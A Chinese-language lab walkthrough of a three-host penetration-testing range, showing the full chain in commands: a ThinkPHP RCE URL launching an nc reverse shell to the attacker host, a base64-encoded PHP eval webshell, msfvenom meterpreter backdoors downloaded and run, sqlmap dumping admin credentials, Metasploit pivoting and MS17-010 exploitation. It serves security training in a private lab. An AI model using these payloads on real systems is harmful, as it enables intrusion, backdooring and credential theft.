## 0x00 靶场介绍以及环境搭建

引用一下迪总给的拓扑图，非常清晰：

![image](https://image.3001.net/images/20220601/1654086188_62975a2c827e6b8426dfd.png!small)

`Target1 / 2 / 3`分别对应`CentOS7 / Ubuntu /
Windows7`，其中`Target1`也就是`Web`服务器需要启动一下宝塔（注意看靶机描述信息）：

    
    
    /etc/init.d/bt start
    /etc/init.d/bt restart
    

**注意：不要勾选这一选项，否则后面代理就就没有意义了。建议导入后打开虚拟机，使用`root/teamssix.com`登录主机，通过`ifconfig`检查网络情况是否正常。**

![image](https://image.3001.net/images/20220601/1654086230_62975a561b2393628df68.png!small)

另外，我使用的是`2022`版的`kali`，部分命令可能与往前有些许出入，请读者自行斟酌。

## 0x01 Target1

    
    
    # 网段存活主机扫描
    nmap 192.168.46.0/24
    Nmap scan report for 192.168.46.128
    Host is up (0.0014s latency).
    Not shown: 993 closed tcp ports (conn-refused)
    PORT     STATE SERVICE
    21/tcp   open  ftp
    22/tcp   open  ssh
    80/tcp   open  http
    111/tcp  open  rpcbind
    888/tcp  open  accessbuilder
    3306/tcp open  mysql
    8888/tcp open  sun-answerbook
    # 服务识别
    nmap -sV 192.168.46.128 
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-25 08:05 EDT
    Nmap scan report for 192.168.46.128
    Host is up (0.00069s latency).
    Not shown: 993 closed tcp ports (conn-refused)
    PORT     STATE SERVICE VERSION
    21/tcp   open  ftp     Pure-FTPd
    22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
    80/tcp   open  http    nginx
    111/tcp  open  rpcbind 2-4 (RPC #100000)
    888/tcp  open  http    nginx
    3306/tcp open  mysql   MySQL (unauthorized)
    8888/tcp open  http    Ajenti http control panel
    

通过虚拟机描述信息可以看到宝塔面板的入口地址已经用户名密码，但这只是为了方便我们处理机器问题，访问`80`端口的`index.php`（如果没有可以尝试登录宝塔改一下网站默认站点），可以发现目标使用了`ThinkPHP`框架，这个框架的漏洞广为流传，网上搜一下就有很多。

![image](https://image.3001.net/images/20220601/1654086265_62975a797052a9a23c33a.png!small)

用`?s=1`可以看到版本是`5.0.15`，拿工具测一测看看有没有漏洞就行（`github`上就有这个工具）：

![image](https://image.3001.net/images/20220601/1654086287_62975a8f91ed1bf4d5856.png!small)

反弹shell（也可以工具或者手工写`Webshell`，然后蚁剑连接，但要注意`$_POST`被过滤了，可以`Base64`编码绕过）：

    
    
    # 我不理解为什么nc反弹得到的shell和MSF、蚁剑拿到的shell都是www命令但nc不能执行很多命令（如ifconfig），如果有大佬能搞清楚这个问题，欢迎评论区指教
    http://192.168.46.128/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=nc 192.168.46.129 4444 -e /bin/bash
    # 另一种方式：蚁剑写入Webshell
    http://192.168.46.128/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo "PD9waHAgQGV2YWwoJF9QT1NUWydUdXprMSddKTsgPz4=" | base64 -d > shell.php
    

利用过程：

    
    
    # 测试是否成功反弹
    id
    # 升级终端
    python -c 'import pty;pty.spawn("/bin/bash")'
    # 查找flag
    find / -name "flag*" 2>/dev/null
    # ip和ifconfig命令执行失败，不知道什么原因
    # 生成后门程序
    msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.46.129 lport=5555 -f elf > horse.elf
    # 开放Web服务，将后门程序挂载到上面（用蚁剑传上去也行）
    python -m http.server 8888
    # 打开另一个终端，启动MSF监听（以root权限打开，后面要用到ARP扫描模块需要root权限）
    sudo msfconsole
    use exploit/multi/handler
    set payload linux/x64/meterpreter/reverse_tcp
    set lhost 192.168.46.129
    set lport 5555
    run
    # 切回Target1，切换到/tmp
    cd /tmp
    # 下载后门程序
    wget "http://192.168.46.129:8888/horse.elf"
    # 赋予执行权限
    chmod +x horse.elf
    # 执行
    ./horse.elf
    

然后就是内网渗透了，第一步肯定是要做内网信息收集了：

    
    
    # 获取本地所在子网信息，可以看到存在22网段
    run get_local_subnets
    Local subnet: 192.168.22.0/255.255.255.0
    Local subnet: 192.168.46.0/255.255.255.0
    # 查看路由信息，会发现还没有路由
    run autoroute -p
    # 添加22网段的路由信息，这样kali就能与22网段互通了
    run autoroute -s 192.168.22.0/24
    # 或者使用MSF推荐的命令，将上面的命令整合（自动根据子网信息添加路由）
    run post/multi/manage/autoroute
    # 先切到控制台
    background
    # 配置socks5代理（将Target1作为代理以访问内网主机，后面会解释原理）
    use auxiliary/server/socks_proxy
    # 查看默认配置（用户名密码就不搞了）
    show options
    # 设置端口为2222（别管SRVHOST，血泪教训）
    set srvport 2222
    # run
    run
    

在`kali`中，我们可以通过`sudo vim /etc/proxychains4.conf`修改`proxychains`配置文件：

![image](https://image.3001.net/images/20220601/1654086310_62975aa6cc8580eb20d60.png!small)

    
    
    # 挂代理扫描时间会比较长，结果为.129（因为我开了DHCP）
    proxychains4 nmap -p80 -Pn 192.168.22.0/24
    # 扫描.129，全端口太久了我就不扫了
    proxychains4 nmap -sV -Pn 192.168.22.129
    

有一说一，`proxychains`确实不如`Windows`挂代理来得好使（可以`Proxifier`挂代理，用`Zenmap`扫端口，速度快很多）：

![image](https://image.3001.net/images/20220601/1654086404_62975b04736f0d01e63c1.png!small)

## 0x02 Target2

访问`80`端口，看网页源码有惊喜（一个`SQL`注入）：

![image](https://image.3001.net/images/20220601/1654086490_62975b5a2dd577f9f40f5.png!small)

然后就是`sqlmap`一把梭：

    
    
    proxychains4 sqlmap -u "http://192.168.22.129/index.php?keyword=1&r=vul" --batch
    # 爆破bagecms库下的bage_admin表
    proxychains4 sqlmap -u "http://192.168.22.129/index.php?keyword=1&r=vul" -D "bagecms" -T "bage_admin" --dump --batch
    # 测试了--is-dba，不是高权限，那就不尝试--os-shell了
    

![image](https://image.3001.net/images/20220601/1654086522_62975b7a198beaa546ebe.png!small)

![image](https://image.3001.net/images/20220601/1654086534_62975b86689daf1542ee3.png!small)

`sqlmap`还很贴心地把密码`MD5`解开，结果是`123qwe`，还找到一个`flag`。然后得找找后台，一波信息收集得知这个`CMS`是根据参数作路由的，并根据`robots.txt`的提示可以发现后台地址`http://192.168.22.129/index.php?r=admini/public/login`，登录可以发现第二个`flag`。

![image](https://image.3001.net/images/20220601/1654086555_62975b9b2189dc1046354.png!small)

正常来说要再来一波信息收集，但我就是要自己找，模板修改文件，写入一句话：

![image](https://image.3001.net/images/20220601/1654086576_62975bb025f62a475df61.png!small)

蚁剑连接：

![image](https://image.3001.net/images/20220601/1654086628_62975be44f1d998e63e91.png!small)

然后生成后门，用蚁剑传到`/tmp`目录下：

    
    
    # 生成一个正向连接后门（因为内网主机无法直接与本机通信，因此无法建立反向连接，需要本机通过代理连接到目标机）
    msfvenom -p linux/x64/meterpreter/bind_tcp lport=3210 -f elf > horse2.elf
    # 文件上传之后在Webshell执行命令
    chmod +x horse2.elf
    ./horse2.elf
    # 本机MSF执行命令
    use exploit/multi/handler
    set payload linux/x64/meterpreter/bind_tcp
    set RHOST 192.168.22.129
    set LPORT 3210
    exploit
    run post/multi/manage/autoroute
    

然后，我在这里用`nmap`扫描端口扫了两个钟没结果。。。代理是没问题的，但是速度太慢了，所以我决定用`MSF`提供的主机存活探测，结果可能是线程调高了，把我两个`session`搞没了（我不知道已经重复拿了这两个机子多少次了，五次...或许是十次...有点崩溃，但还是得继续）。

最后扫出来了：

    
    
    proxychains4 nmap -sT -Pn 192.168.33.33 
    Nmap scan report for 192.168.33.33
    Host is up (0.10s latency).
    Not shown: 990 closed tcp ports (conn-refused)
    PORT      STATE SERVICE
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    3389/tcp  open  ms-wbt-server
    49152/tcp open  unknown
    49153/tcp open  unknown
    49154/tcp open  unknown
    49155/tcp open  unknown
    49156/tcp open  unknown
    49157/tcp open  unknown
    

## 0x03 Target3

存在`445`端口的`Windows`主机，用`MS17-010`打一下试试：

    
    
    use exploit/windows/smb/ms17_010_psexec
    set payload windows/x64/meterpreter/bind_tcp
    set RHOSTS 192.168.33.33
    set LPORT 6666
    run
    

成功拿到`shell`：

![image](https://image.3001.net/images/20220601/1654086639_62975bef7102a6cb02821.png!small)

## 参考文章

  * https://teamssix.com/191021-211425.html

